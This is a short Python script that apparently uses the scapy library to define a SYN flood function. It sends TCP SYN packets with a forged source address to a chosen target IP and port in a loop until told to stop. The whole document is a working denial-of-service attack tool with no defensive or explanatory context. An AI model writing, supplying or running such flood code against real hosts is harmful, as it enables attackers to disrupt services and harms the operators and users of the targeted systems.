from scapy.all import *


def syn_flood(target_ip, target_port, stop):
    fake_ip = '192.168.1.1'
    tcp = IP(src=fake_ip, dst=target_ip) / TCP(flags="S", dport=target_port)
    while True:
        if stop():
            break
        send(tcp)
